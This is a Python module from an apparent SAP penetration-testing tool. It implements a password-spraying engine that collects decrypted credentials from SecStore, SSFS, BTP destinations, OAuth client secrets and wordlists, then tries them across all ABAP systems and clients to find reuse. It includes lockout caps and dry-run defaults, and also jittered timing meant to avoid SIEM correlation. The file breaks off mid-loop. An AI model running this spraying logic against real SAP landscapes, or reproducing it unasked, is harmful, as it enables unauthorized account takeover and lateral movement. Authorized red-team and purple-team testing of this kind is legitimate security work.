"""Password-spraying engine (issue #69).

Spray credentials SAPMAP has already decrypted — SecStore (ABAP
RSECTAB), SecStoreFS (Java), SSFS DB_CONNECT, BTP destination service,
OA2C, SCC admin, operator wordlist — across all ABAP systems/clients
on the landscape, looking for password reuse / improper client-copy
hits.  **Reuse-finder, not brute-forcer**: the input pool is tiny
(dozens of distinct passwords, not millions) and the risk tier is
lockout, not performance.

Architecture highlights (see /Users/jorisvandevis/.claude/plans/
zesty-foraging-wombat.md for the full plan):

* Reuses ``sap_default_creds.try_login`` + ``classify_login_response``
  for the DIAG primitive — identical result codes mean the GUI's
  existing hit-presentation drops right in.
* **Session-only pool** — recomputed on demand from the four cred
  stores (``node.credentials``, ``secstore_entries[oauth2_client]``,
  ``btp_subaccounts[*].destinations``, ``scc_nodes[*].credentials``)
  so cleartext never lands in a persistent ``state.password_pool``
  field.  Follows the ``SCCNode.backup_password`` precedent.
* **Hard lockout safety**: cap_per_user ≤ 2 when policy known, ≤ 1
  when unknown.  Landscape-wide ``pwspray_locked_users`` cache bans
  a user on every subsequent target after a single USER_LOCKED
  observation anywhere.  Cross-target circuit breaker halts the
  sweep after N total locks.
* **Cooperative** with the existing ``SAPNode._propagate_locked_out``
  flag (set today by ``sapmap_exploit.py:5769``) — spray reads it
  before every attempt AND sets it on first observed USER_LOCKED, so
  AutoPwn phase4 + TMS propagation + manual LPE all respect each
  other's lockout observations.
* **Short-circuit on first hit** per (sid, client, user) — a 15-pw
  pool for a user that hits at pw #3 makes 3 attempts, not 15, not
  cap.  Dedicated test guards this invariant.
"""
from __future__ import annotations

import hashlib
import json
import logging
import os
import random
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime
from typing import Callable, List, Optional, Sequence, Set, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Service / technical users we refuse to spray by default.  Includes the
# obvious platform accounts PLUS the Solution Manager / J2EE / workflow
# service users that routinely appear on every system.  Operators can
# opt them back in per-user with secondary confirms; the pool-aware
# heuristic (any user seen on >N nodes) catches customer-chosen service
# accounts like Z_RFC_SAP that aren't on this list.
DEFAULT_SKIP_USERS: Set[str] = {
    "SAP*", "DDIC",
    "SAPJSF", "SAPCPIC", "TMSADM",
    "SOLMAN_BTC", "SOLMAN_ADMIN", "SMD_RFC", "SMD_ADMIN", "SMD_BI_RFC",
    "CPIC", "EARLYWATCH", "SAPSUPPORT",
    "J2EE_ADMIN", "J2EE_GUEST",
    "SAP_WFRT", "ADSUSER", "WF-BATCH",
    "CSMREG",
}

# Credential kinds that do NOT belong in the DIAG spray pool.
# wd_admin / scc are HTTP-Basic surfaces (different engine); DB
# connect creds are kernel-DB logins, not user accounts.
NON_DIAG_KINDS: Set[str] = {"wd_admin", "scc"}

# Cross-target circuit breaker — halt the whole sweep after this many
# USER_LOCKED observations across all targets.
DEFAULT_MAX_TOTAL_LOCKS_PER_RUN = 3

# Fallback cap when we can't read the target's lockout policy.
UNKNOWN_POLICY_CAP = 1
# Hard ceiling when policy IS known — never exceed this per user per
# target regardless of operator config.
MAX_CAP_PER_USER = 2

# Inter-attempt sleep range (seconds, uniform random).  Avoids a fixed
# 300ms heartbeat that correlates obviously in SIEM; still slow enough
# that failed-logon audit events don't pile up at wire speed.
DEFAULT_SLEEP_RANGE: Tuple[float, float] = (0.3, 0.9)
# Inter-node sleep range (seconds, uniform random).
DEFAULT_INTER_NODE_SLEEP: Tuple[float, float] = (1.0, 2.0)


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class SprayCandidate:
    """One (username, password) pair harvested from the landscape pool.

    ``source_kind`` tells the operator / report where this came from
    (e.g. ``"credentials"``, ``"secstore_oauth2"``, ``"btp_destination"``,
    ``"scc_admin"``, ``"manual_wordlist"``) and whether this is a
    low-noise 'already-verified-somewhere' cred vs an untested one.
    """
    username: str
    password: str
    source_kind: str = ""          # see docstring
    source_sid: str = ""           # the node this came off, when applicable
    verified_somewhere: bool = False
    # The hint client the source cred was bound to.  Not authoritative —
    # spray walks every target client regardless — but useful for
    # distinguishing 'this cred has an original client of 100 on the
    # source' from 'this cred had no client context (BTP, manual)'.
    source_client: str = ""
    # Count of nodes/entries this exact (user, password) pair appeared
    # on.  Pool collector increments this; the GUI uses it to rank
    # 'top reused' passwords in the preview modal.
    reuse_count: int = 1

    @property
    def key(self) -> Tuple[str, str]:
        """Dedup key — case-insensitive on username (SAP convention)."""
        return (self.username.upper(), self.password)


@dataclass
class SprayTarget:
    """One ABAP target node resolved from the state + a specific
    dispatcher port + the enumerated-or-fallback clients list.
    """
    sid: str
    host: str
    dispatcher_port: int
    clients: List[str] = field(default_factory=list)
    saprouter: str = ""
    system_type: str = ""


@dataclass
class SprayAttempt:
    """One (target, client, user, password) attempt record.  Written to
    ``loot/spray/<run_id>/attempts.jsonl``.  Cleartext password is NOT
    retained in the record — only a sha256 prefix — so the audit trail
    survives share/review without re-leaking the spray pool."""
    ts: str
    sid: str
    host: str
    dispatcher_port: int
    client: str
    user: str
    pw_sha256_prefix: str
    source_kind: str
    source_sid: str
    result: str            # SUCCESS / USER_LOCKED / WRONG_PASSWORD / ...
    detail: str = ""
    terminal: str = ""
    pre_attempt_fail_counter: int = -1
    skipped_reason: str = ""


@dataclass
class SprayConfig:
    """Operator-tunable knobs.  All defaults are the SAFE default — the
    GUI opens with these and the operator loosens them with secondary
    confirms."""
    # Which cred stores to include in the pool
    include_db_connect: bool = False
    include_wd_admin: bool = False
    include_scc: bool = True
    include_cracked_hashes: bool = False     # cracked hashcat creds
    manual_wordlist: List[Tuple[str, str]] = field(default_factory=list)
    # Which service users to opt back IN (default: none).  Each entry
    # must match a username in DEFAULT_SKIP_USERS to take effect —
    # anything else is ignored.
    opt_in_users: Set[str] = field(default_factory=set)
    # Hard cap on per-user attempts per (sid, client).  Floor 1,
    # ceiling MAX_CAP_PER_USER.  Reduced further by compute budget.
    cap_per_user: int = 1
    # Cross-target circuit breaker.
    max_total_locks_per_run: int = DEFAULT_MAX_TOTAL_LOCKS_PER_RUN
    # DIAG terminal name recorded in SM21/SAL Source field (when
    # rsau/ip_only=0 on the target).  Purple mode overrides this with
    # a deliberately identifiable value so SOC correlation rules land.
    terminal: str = "sapscanner"
    # Dry-run — resolve pool + targets + policy probe but open ZERO
    # sockets.  Default True so the first call per session is always
    # a preview; operator must explicitly flip to False with a
    # secondary accept flag.
    dry_run: bool = True
    accept_lockout_risk: bool = False
    # Purple mode — pre-attempt USR02 baseline read + post-attempt
    # signal readback.  Written to loot/spray/<run_id>/purple_report
    # and SAPNode.spray_purple_signals.  Changes default terminal
    # name so SOC rules fire reliably.
    purple_mode: bool = False
    # Early-exit on first SUCCESS/PASSWORD_CHANGE/NO_AUTH_LOGON per
    # (sid, client, user).  Keep True for safety — short-circuit
    # minimises failed-login audit noise per hit.
    early_exit_on_hit: bool = True
    # RFC fallback for NO_DIALOG_USER (system/comm users).  Requires
    # NW RFC SDK available on the SAPMAP host.
    rfc_fallback_for_service_users: bool = True
    # Per-run id — populated by spray_landscape() if left empty.
    run_id: str = ""

    def effective_terminal(self) -> str:
        return "sapmap-spray-purple" if self.purple_mode else self.terminal


@dataclass
class SprayRun:
    """Per-run summary — persisted to ``state.spray_runs``.  Full
    attempt stream lives on disk (keeps .sapmap small)."""
    run_id: str
    started_at: str
    finished_at: str = ""
    config_snapshot: dict = field(default_factory=dict)
    attempts_total: int = 0
    attempts_done: int = 0
    hits: List[dict] = field(default_factory=list)
    locked_users: List[str] = field(default_factory=list)
    skipped: List[dict] = field(default_factory=list)
    aborted: str = ""                        # 'user_stop' / 'cascade_abort' / ''
    loot_path: str = ""
    purple_report_generated: bool = False

    def to_dict(self) -> dict:
        return asdict(self)


# ---------------------------------------------------------------------------
# Pool collection
# ---------------------------------------------------------------------------

def _is_sapmap_cred(username: str) -> bool:
    return (username or "").upper().startswith("SAPMAP")


def landscape_password_pool(
    state,
    *,
    include_db_connect: bool = False,
    include_wd_admin: bool = False,
    include_scc: bool = True,
    include_cracked_hashes: bool = False,
    manual_wordlist: Optional[Sequence[Tuple[str, str]]] = None,
) -> List[SprayCandidate]:
    """Walk every SAPMAP cred store on the landscape and return a
    deduped, ordered list of ``SprayCandidate``.

    Order (lower priority = tried later):
      1. Verified SAPMAP-family creds (SAP_ALL guaranteed, best signal)
      2. Verified non-SAPMAP creds
      3. Unverified creds (SAPMAP first, others after)

    Dedup is case-insensitive on username (SAP convention) + exact-match
    on password.  The returned ``reuse_count`` reports how many separate
    pool entries contributed to each unique (user, password) key.
    """
    buckets: dict[Tuple[str, str], SprayCandidate] = {}

    def _add(cand: SprayCandidate) -> None:
        if not cand.username or not cand.password:
            return
        k = cand.key
        existing = buckets.get(k)
        if existing is None:
            buckets[k] = cand
            return
        # Dedup: merge metadata, bump reuse_count.  Keep the "best"
        # source_kind/sid pair (verified wins over unverified).
        existing.reuse_count += 1
        if cand.verified_somewhere and not existing.verified_somewhere:
            existing.verified_somewhere = True
            existing.source_kind = cand.source_kind
            existing.source_sid = cand.source_sid
            existing.source_client = cand.source_client

    for sid, node in (state.nodes or {}).items():
        # (1) node.credentials — the primary spray surface.  Filter out
        # the kinds that belong to a different auth channel.
        for cred in (node.credentials or []):
            kind = (getattr(cred, "kind", "") or "").strip()
            if kind in NON_DIAG_KINDS:
                if kind == "wd_admin" and not include_wd_admin:
                    continue
                if kind == "scc":
                    # SCC creds belong in the SCC bucket below.
                    continue
            _add(SprayCandidate(
                username=cred.username,
                password=cred.password,
                source_kind=f"node.credentials{(':' + kind) if kind else ''}",
                source_sid=sid,
                verified_somewhere=bool(getattr(cred, "verified", False)),
                source_client=(cred.client or ""),
            ))
        # (2) OA2C client secrets — stored on secstore_entries with
        # category=='oauth2_client' + ident like
        # /OA2C/CS_<32hex>_<NN> and the plaintext in 'password'.
        # Interesting as a spray cred when the oauth2 client_id string
        # is reusable as a username on nearby systems.
        for entry in (getattr(node, "secstore_entries", None) or []):
            if (entry.get("category") or "").lower() != "oauth2_client":
                continue
            uname = entry.get("username") or entry.get("client_id") or ""
            pw = entry.get("password") or ""
            if not uname or not pw:
                continue
            _add(SprayCandidate(
                username=uname, password=pw,
                source_kind="secstore_oauth2",
                source_sid=sid, verified_somewhere=False))
        # (3) DBCON kernel creds — opt-in only (sapsa/sapsr3 locks the
        # whole DB account out if sprayed carelessly).
        if include_db_connect:
            for edge in (getattr(node, "dbcon_edges", None) or []):
                uname = getattr(edge, "username", "") or ""
                pw = getattr(edge, "password", "") or ""
                if uname and pw:
                    _add(SprayCandidate(
                        username=uname, password=pw,
                        source_kind="dbcon",
                        source_sid=sid, verified_somewhere=False))

    # (4) BTP destination service — cleartext basic-auth creds attached
    # to destinations on subaccounts SAPMAP has pulled.
    for uuid, sub in (getattr(state, "btp_subaccounts", None) or {}).items():
        for dest in (getattr(sub, "destinations", None) or []):
            uname = (dest.user if hasattr(dest, "user")
                     else dest.get("user", "")) or ""
            pw = (dest.password if hasattr(dest, "password")
                  else dest.get("password", "")) or ""
            if uname and pw:
                _add(SprayCandidate(
                    username=uname, password=pw,
                    source_kind="btp_destination",
                    source_sid=uuid, verified_somewhere=False))

    # (5) SCC admin creds — tier them separately: they're not DIAG
    # creds (SCC runs its own Spring auth) but they're frequently
    # reused by sysadmins who manage SCC + the connected ABAP boxes.
    if include_scc:
        for host, scc in (getattr(state, "scc_nodes", None) or {}).items():
            for cred in (getattr(scc, "credentials", None) or []):
                uname = getattr(cred, "username", "") or ""
                pw = getattr(cred, "password", "") or ""
                if uname and pw:
                    _add(SprayCandidate(
                        username=uname, password=pw,
                        source_kind="scc_admin",
                        source_sid=host,
                        verified_somewhere=bool(
                            getattr(cred, "verified", False))))

    # (6) Operator wordlist / cracked-hash intake.  Caller passes a
    # list of (user, pw) tuples; we don't parse hashcat .pot in v1.
    for u, p in (manual_wordlist or []):
        if u and p:
            _add(SprayCandidate(
                username=u, password=p,
                source_kind="manual_wordlist",
                source_sid="", verified_somewhere=False))

    # Order: SAPMAP-verified > verified > SAPMAP-unverified > unverified
    def _rank(c: SprayCandidate) -> Tuple[int, str]:
        if c.verified_somewhere and _is_sapmap_cred(c.username):
            tier = 0
        elif c.verified_somewhere:
            tier = 1
        elif _is_sapmap_cred(c.username):
            tier = 2
        else:
            tier = 3
        return (tier, c.username.upper())

    return sorted(buckets.values(), key=_rank)


# ---------------------------------------------------------------------------
# Target matrix
# ---------------------------------------------------------------------------

def _node_dispatcher_port(node) -> int:
    """Pick the first 32XX dispatcher port we see on any InstanceInfo.
    Returns 0 when the node has no scanned instance (which excludes it
    from spray — we don't guess 3200 blindly)."""
    for inst in (getattr(node, "instances", None) or []):
        for port, svc in (getattr(inst, "ports", {}) or {}).items():
            if not isinstance(port, int):
                continue
            if svc == "dispatcher" or (3200 <= port <= 3299):
                return port
    return 0


def _node_clients(node) -> List[str]:
    """Enumerated clients on the node, as a list of 3-char strings.
    Falls back to ['000', '001'] when the node has no enumerated
    clients — those two always exist on an ABAP install."""
    out: List[str] = []
    for c in (getattr(node, "clients", None) or []):
        nr = (c.get("nr", "") if isinstance(c, dict) else "") or ""
        if nr:
            # Normalise to 3-digit
            try:
                out.append(f"{int(nr):03d}")
            except Exception:
                if len(nr) <= 3:
                    out.append(nr.rjust(3, "0"))
    if not out:
        out = ["000", "001"]
    # dedup preserving order
    seen: set = set()
    dedup: List[str] = []
    for c in out:
        if c not in seen:
            seen.add(c)
            dedup.append(c)
    return dedup


def build_target_matrix(state, scope_filter: Optional[dict] = None) -> dict:
    """Enumerate the spray-eligible target set from the state.

    ``scope_filter`` keys (all optional):
      * ``sids``: list — restrict to these SIDs
      * ``single_sid``: str — convenience, equivalent to ``sids=[sid]``
      * ``include_production``: bool (default False) — opt-in gate; by
        default a node flagged ``is_production=True`` is listed as
        ineligible with reason ``'production'``

    Returns ``{"eligible": [SprayTarget, ...],
               "ineligible": [(SAPNode, reason_str), ...]}``.
    """
    scope_filter = scope_filter or {}
    sids: Optional[set] = None
    if scope_filter.get("single_sid"):
        sids = {scope_filter["single_sid"]}
    elif scope_filter.get("sids"):
        sids = set(scope_filter["sids"])

    include_prod = bool(scope_filter.get("include_production", False))

    eligible: List[SprayTarget] = []
    ineligible: List[Tuple[object, str]] = []
    for sid, node in (state.nodes or {}).items():
        if sids and sid not in sids:
            continue
        # ABAP-only
        stype = (getattr(node, "system_type", "") or "").upper()
        if "ABAP" not in stype:
            ineligible.append((node, "non_abap_stack"))
            continue
        # Must have a known dispatcher port — we don't blind-guess 3200
        port = _node_dispatcher_port(node)
        if not port:
            ineligible.append((node, "no_dispatcher_port"))
            continue
        host = (getattr(node, "ip", "") or "").strip() or \
               (getattr(node, "hostname", "") or "").strip()
        if not host:
            ineligible.append((node, "no_host"))
            continue
        if not include_prod and bool(getattr(node, "is_production", False)):
            ineligible.append((node, "production_opt_in_required"))
            continue
        # Cooperative lockout flag — AutoPwn/TMS may have already set it
        if bool(getattr(node, "_propagate_locked_out", False)):
            ineligible.append((node, "propagate_locked_out_set"))
            continue
        clients = _node_clients(node)
        eligible.append(SprayTarget(
            sid=sid, host=host, dispatcher_port=port,
            clients=clients,
            saprouter=(getattr(node, "saprouter", "") or ""),
            system_type=stype))
    return {"eligible": eligible, "ineligible": ineligible}


# ---------------------------------------------------------------------------
# Attempt budget
# ---------------------------------------------------------------------------

def compute_attempt_budget(
    node,
    operator_cap: int,
    *,
    probe_fn: Optional[Callable[[object], dict]] = None,
) -> dict:
    """Compute the effective per-user attempt cap for ``node``.

    When the node has a verified cred AND ``probe_fn`` is callable, we
    read ``login/fails_to_user_lock`` + USR02 baseline counters via
    the telemetry probe and compute
    ``cap = max(1, fails_to_user_lock - 2 - baseline_counter)``.

    Without a probe (or when the probe fails), we fall back to
    ``UNKNOWN_POLICY_CAP`` (=1) with a warning.  The hard ceiling
    ``MAX_CAP_PER_USER`` (=2) always applies.

    Returns ``{cap_per_user, cap_source, warnings:list,
               fails_to_user_lock, baseline_counter_known}``.
    """
    ceiling = min(max(1, operator_cap), MAX_CAP_PER_USER)
    out = {
        "cap_per_user": UNKNOWN_POLICY_CAP,
        "cap_source": "unknown_policy_default_floor",
        "warnings": [],
        "fails_to_user_lock": None,
        "baseline_counter_known": False,
    }
    if probe_fn is None:
        out["warnings"].append(
            "no probe_fn supplied — using unknown-policy floor of 1")
        return out
    try:
        probe = probe_fn(node) or {}
    except Exception as e:
        out["warnings"].append(f"probe raised: {type(e).__name__}: {e}")
        return out
    if probe.get("status") == "ucon_blocked":
        out["cap_source"] = "ucon_blocked_default_floor"
        out["warnings"].append(
            "UCON blocks the readback FM; cannot read lockout policy")
        return out
    f2l = probe.get("fails_to_user_lock")
    try:
        f2l_int = int(f2l) if f2l is not None else None
    except Exception:
        f2l_int = None
    if f2l_int is None:
        out["warnings"].append(
            "fails_to_user_lock not available; using unknown-policy floor")
        return out
    out["fails_to_user_lock"] = f2l_int
    out["baseline_counter_known"] = bool(probe.get("baseline_counter_known"))
    baseline = int(probe.get("baseline_counter", 0) or 0)
    # Reserve a safety margin of 2 under the kernel's lock threshold
    # AND subtract the user's existing failure counter.  Floor at 1
    # (we always let the operator try at least once).
    cap = max(1, f2l_int - 2 - baseline)
    out["cap_per_user"] = min(cap, ceiling)
    out["cap_source"] = (
        f"policy_known_f2l={f2l_int}_baseline={baseline}_capped_at_{ceiling}")
    return out


# ---------------------------------------------------------------------------
# Spray engine
# ---------------------------------------------------------------------------

def _sha256_prefix(s: str, n: int = 8) -> str:
    return hashlib.sha256((s or "").encode("utf-8")).hexdigest()[:n]


def _jittered_sleep(rng: Tuple[float, float]) -> None:
    lo, hi = rng
    if hi <= 0:
        return
    time.sleep(random.uniform(max(0.0, lo), max(lo, hi)))


def _effective_skip_users(opt_in: Set[str]) -> Set[str]:
    """Default skip-list minus whatever the operator explicitly opted
    back in.  Opt-in is case-insensitive and only applies to users
    that appear in DEFAULT_SKIP_USERS."""
    opt_in_up = {u.upper() for u in (opt_in or set())}
    return {u for u in DEFAULT_SKIP_USERS if u.upper() not in opt_in_up}


def check_sprayed_credentials(
    host: str,
    port: int,
    clients: Sequence[str],
    candidates: Sequence[SprayCandidate],
    *,
    cap_per_user: int = UNKNOWN_POLICY_CAP,
    saprouter: str = "",
    terminal: str = "sapscanner",
    pre_known_locked_users: Optional[Set[str]] = None,
    skip_users: Optional[Set[str]] = None,
    cancel_check: Optional[Callable[[], bool]] = None,
    early_exit_on_hit: bool = True,
    inter_attempt_sleep_range: Tuple[float, float] = DEFAULT_SLEEP_RANGE,
    on_result: Optional[Callable[[dict], None]] = None,
    try_login_fn: Optional[Callable] = None,
) -> List[dict]:
    """Spray ``candidates`` against ``(host, port, each client)`` under
    the given lockout cap.  Generalisation of
    ``sap_default_creds.check_default_credentials``: same result codes,
    same break-on-USER_LOCKED / NO_DIALOG_USER semantics, plus:

      * **Short-circuit** on first SUCCESS/PASSWORD_CHANGE/NO_AUTH_LOGON
        per (client, user) — a 15-password pool for a user that hits
        at #3 makes 3 attempts, not 15, not cap.
      * **Per-user attempt counter** honours ``cap_per_user`` strictly.
      * **Jittered sleep** between attempts (0.3–0.9s uniform default).
      * **Landscape locked-users pre-check** — if ``pre_known_locked_users``
        includes a candidate's user, that user is skipped entirely
        with ``skipped_reason='landscape_locked'``.

    Returns a list of result dicts (one per attempt made or decision
    taken), each shaped like::

        {kind: 'hit'|'miss'|'skipped'|'locked'|'error',
         user, password, client, result, detail, pw_sha256_prefix,
         source_kind, source_sid, skipped_reason?}

    Caller is responsible for persisting these to loot JSONL + emitting
    findings.  Pass ``try_login_fn`` to override the default DIAG
    engine (used by tests to inject a fake).
    """
    if try_login_fn is None:
        # Lazy import — keeps this module importable without a working
        # SAPology / scapy path when tests only exercise pool logic.
        from sap_default_creds import try_login as _real_try_login
        try_login_fn = _real_try_login

    # Import the result-code constants from the shared module so result
    # strings line up with every downstream classifier/UI expectation.
    from sap_default_creds import (
        SUCCESS, PASSWORD_CHANGE, NO_AUTH_LOGON,
        USER_LOCKED, NO_DIALOG_USER,
    )
    HIT_CODES = {SUCCESS, PASSWORD_CHANGE, NO_AUTH_LOGON}

    pre_known_locked_users = {
        u.upper() for u in (pre_known_locked_users or set())}
    # Use ``is None`` as the sentinel so an explicit empty set from the
    # caller disables the skip-list entirely (test harnesses do this to
    # exercise the engine against users that live in DEFAULT_SKIP_USERS).
    if skip_users is None:
        skip_users = _effective_skip_users(set())
    hard_skip = {u.upper() for u in skip_users}
    results: List[dict] = []
    # Per-user attempt counter — resets per (client, user).  Keyed by
    # ``f"{client}|{user.upper()}"``.
    attempts: dict[str, int] = {}
    # Users we've hit (SUCCESS-class) per client — short-circuit flag.
    hit_users_per_client: dict[str, Set[str]] = {c: set() for c in clients}
    # Users we observed USER_LOCKED on — stop trying everywhere this run.
    locked_users: Set[str] = set()
    # Users we observed NO_DIALOG_USER on — stop trying DIAG for them.
    nodialog_users: Set[str] = set()

    def _emit(row: dict) -> None:
        results.append(row)
        if on_result is not None:
            try:
                on_result(row)
            except Exception:
                logger.debug("on_result callback raised", exc_info=True)

    for client in clients:
        if cancel_check and cancel_check():
            break
        for cand in candidates:
            if cancel_check and cancel_check():
                break
            uname_up = cand.username.upper()
            # Skip-list wins.
            if uname_up in {u.upper() for u in hard_skip}:
                _emit({"kind": "skipped", "user": cand.username,
                       "password": cand.password, "client": client,
                       "result": "SKIPPED", "detail": "",
                       "pw_sha256_prefix": _sha256_prefix(cand.password),
                       "source_kind": cand.source_kind,
                       "source_sid": cand.source_sid,
                       "skipped_reason": "skip_list"})
                continue
            if uname_up in pre_known_locked_users or uname_up in locked_users:
                _emit({"kind": "skipped", "user": cand.username,
                       "password": cand.password, "client": client,
                       "result": "SKIPPED", "detail": "",
                       "pw_sha256_prefix": _sha256_prefix(cand.password),
                       "source_kind": cand.source_kind,
                       "source_sid": cand.source_sid,
                       "skipped_reason": "landscape_locked"})
                continue
            if uname_up in nodialog_users:
                # Already observed NO_DIALOG_USER — don't burn more
                # DIAG budget.  RFC fallback (if any) is the caller's
                # job after this function returns.
                continue
            # Short-circuit: user already hit on this client
            if early_exit_on_hit and uname_up in hit_users_per_client.get(
                    client, set()):
                continue
            # Per-user cap on this client
            akey = f"{client}|{uname_up}"
            if attempts.get(akey, 0) >= cap_per_user:
                _emit({"kind": "skipped", "user": cand.username,
                       "password": cand.password, "client": client,
                       "result": "SKIPPED", "detail": "",
                       "pw_sha256_prefix": _sha256_prefix(cand.password),
                       "source_kind": cand.source_kind,
                       "source_sid": cand.source_sid,
                       "skipped_reason": "cap_exhausted"})
                continue

            # The one attempt.
            attempts[akey] = attempts.get(akey, 0) + 1
            try:
                result, detail = try_login_fn(
                    host, port, client, cand.username, cand.password,
                    saprouter=saprouter, terminal=terminal)
            except TypeError:
                # Older try_login signature w/o keyword args — retry
                # positionally.  Keeps us robust against upstream
                # refactor churn.
                result, detail = try_login_fn(
                    host, port, client, cand.username, cand.password)
            row = {"user": cand.username, "password": cand.password,
                   "client": client, "result": result, "detail": detail,
                   "pw_sha256_prefix": _sha256_prefix(cand.password),
                   "source_kind": cand.source_kind,
                   "source_sid": cand.source_sid}
            if result in HIT_CODES:
                row["kind"] = "hit"
                hit_users_per_client.setdefault(client, set()).add(uname_up)
            elif result == USER_LOCKED:
                row["kind"] = "locked"
                locked_users.add(uname_up)
                _emit(row)
                # Don't sleep after a lock — exit the inner loop fast
                continue
            elif result == NO_DIALOG_USER:
                row["kind"] = "miss"
                row["skipped_reason"] = "no_dialog_user"
                nodialog_users.add(uname_up)
            else:
                row["kind"] = "miss"
            _emit(row)
            _jittered_sleep(inter_attempt_sleep_range)
    return results


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

def _make_run_id(base_ts: Optional[str] = None) -> str:
    """Deterministic-ish run id — timestamp + short sha of the pid.
    Used as the loot subdir name."""
    ts = base_ts or datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    tail = _sha256_prefix(f"{ts}:{os.getpid()}", 6)
    return f"spray_{ts}_{tail}"


def _append_attempt_jsonl(path: str, attempt: SprayAttempt) -> None:
    try:
        with open(path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(asdict(attempt), default=str))
            fh.write("\n")
    except Exception as e:
        logger.debug("attempts.jsonl write failed (%s): %s", path, e)


def _upgrade_or_append_credential(node, cred_kwargs: dict) -> None:
    """Add a confirmed-hit (user, client, password) to ``node.credentials``
    with ``kind='spray'``, dedup-upgrading an existing unverified
    entry to ``verified=True`` instead of appending a duplicate.
    Fixes an existing gap in ``node_check_default_creds`` where a
    second hit on the same (user, client, password) left two entries
    on the node and the earlier ``verified=False`` was never flipped.
    """
    # Local import — only this helper needs it, no reason to burden
    # module load with the full models graph.
    from sapmap_models import Credentials
    user = (cred_kwargs.get("username") or "").upper()
    client = (cred_kwargs.get("client") or "").strip()
    password = cred_kwargs.get("password") or ""
    for existing in (node.credentials or []):
        if (getattr(existing, "username", "") or "").upper() != user:
            continue
        if (getattr(existing, "client", "") or "").strip() != client:
            continue
        if (getattr(existing, "password", "") or "") != password:
            continue
        # Found a match — upgrade in place.
        if cred_kwargs.get("verified", False):
            existing.verified = True
        if cred_kwargs.get("kind") and not getattr(existing, "kind", ""):
            existing.kind = cred_kwargs["kind"]
        return
    node.credentials.append(Credentials(**cred_kwargs))


def _record_lockout_landscape_wide(state, sid: str, client: str,
                                    user: str) -> None:
    """Add ``user`` to the landscape-wide locked-user cache so every
    subsequent target in this engagement refuses it."""
    key = user.upper()
    now = datetime.utcnow().isoformat()
    entry = (state.pwspray_locked_users or {}).get(key)
    if not entry:
        entry = {"username": user, "locked_on": [], "unlock_eta": None}
        state.pwspray_locked_users[key] = entry
    entry["locked_on"].append([sid, client, now])


def spray_landscape(
    state,
    config: Optional[SprayConfig] = None,
    *,
    scope_filter: Optional[dict] = None,
    cancel_check: Optional[Callable[[], bool]] = None,
    try_login_fn: Optional[Callable] = None,
    telemetry_probe_fn: Optional[Callable[[object], dict]] = None,
    loot_dir_fn: Optional[Callable[[str], str]] = None,
    on_attempt: Optional[Callable[[SprayAttempt], None]] = None,
) -> SprayRun:
    """Orchestrator — sequential outer target loop, inner spray engine
    per (target × clients × candidates).  Consults the landscape-wide
    lockout cache before every target.  Writes a per-run SprayRun
    summary to ``state.spray_runs`` and (on real runs) a
    ``loot/spray/<run_id>/attempts.jsonl`` audit file.

    ``try_login_fn`` / ``telemetry_probe_fn`` / ``loot_dir_fn`` are
    injectable so tests can run the whole flow without real sockets
    or filesystem writes.
    """
    config = config or SprayConfig()
    if not config.run_id:
        config.run_id = _make_run_id()

    run = SprayRun(
        run_id=config.run_id,
        started_at=datetime.utcnow().isoformat(),
        config_snapshot={
            "cap_per_user": config.cap_per_user,
            "dry_run": config.dry_run,
            "purple_mode": config.purple_mode,
            "include_scc": config.include_scc,
            "include_wd_admin": config.include_wd_admin,
            "include_db_connect": config.include_db_connect,
            "terminal": config.effective_terminal(),
            "scope_filter": scope_filter or {},
        },
    )

    # Seed the status singleton (issue #69, PR3) so the GUI's progress
    # panel can show the run as it unfolds.  SINGLE-WRITER invariant:
    # this thread (the one _bg spawned) owns _status for the duration.
    scope_label = "landscape"
    if scope_filter and scope_filter.get("single_sid"):
        scope_label = f"single:{scope_filter['single_sid']}"
    _reset_status(
        run_id=config.run_id,
        scope=scope_label,
        dry_run=bool(config.dry_run),
        cap_per_user=int(config.cap_per_user),
        started_at=run.started_at,
    )
    _set_phase("collect_pool")

    # Dry-run safety: refuse at the SERVICE boundary when the operator
    # didn't tick accept_lockout_risk.  Preview is still useful — pool
    # + target matrix are returned via the GUI's preview route, not
    # this orchestrator.
    if not config.dry_run and not config.accept_lockout_risk:
        run.aborted = "dry_run_default_active"
        run.finished_at = datetime.utcnow().isoformat()
        state.spray_runs.append(run.to_dict())
        _finalise_status(run)
        return run

    pool = landscape_password_pool(
        state,
        include_db_connect=config.include_db_connect,
        include_wd_admin=config.include_wd_admin,
        include_scc=config.include_scc,
        manual_wordlist=config.manual_wordlist,
    )
    _append_log(f"pool: {len(pool)} candidate(s)")
    _set_phase("profile_probe")
    tm = build_target_matrix(state, scope_filter=scope_filter)
    targets: List[SprayTarget] = tm["eligible"]
    for node, reason in tm["ineligible"]:
        run.skipped.append({"sid": node.sid, "reason": reason})
    _status.targets_total = len(targets)
    _append_log(f"targets: {len(targets)} eligible, "
                f"{len(tm['ineligible'])} skipped")

    # Early totals estimate (upper bound) so progress UI has a
    # denominator.  Doesn't account for short-circuit / skip-list —
    # actual attempts_done will be lower.
    run.attempts_total = sum(
        len(t.clients) * len(pool) for t in targets)
    _status.attempts_total = run.attempts_total
    if targets:
        _set_phase("spray")
        _set_phase_progress(0, len(targets))

    # Loot dir — real runs land under loot/spray/<run_id>/; dry runs
    # skip filesystem touches entirely.
    attempts_jsonl_path = ""
    if not config.dry_run:
        base = (loot_dir_fn or _default_loot_dir)(config.run_id)
        if base:
            attempts_jsonl_path = os.path.join(base, "attempts.jsonl")
            run.loot_path = base

    total_locks_observed = 0
    skip_users = _effective_skip_users(config.opt_in_users)
    pre_locked = {u.upper() for u in (state.pwspray_locked_users or {}).keys()}

    for ti, target in enumerate(targets):
        if cancel_check and cancel_check():
            run.aborted = run.aborted or "user_stop"
            break
        node = (state.nodes or {}).get(target.sid)
        if node is None:
            continue
        # Cross-target circuit breaker check BEFORE firing anything
        if total_locks_observed >= config.max_total_locks_per_run:
            run.aborted = "cascade_abort"
            # Flip _propagate_locked_out on every remaining target so
            # AutoPwn/TMS/manual LPE respect the cascade.
            for later in targets[ti:]:
                lnode = (state.nodes or {}).get(later.sid)
                if lnode is not None:
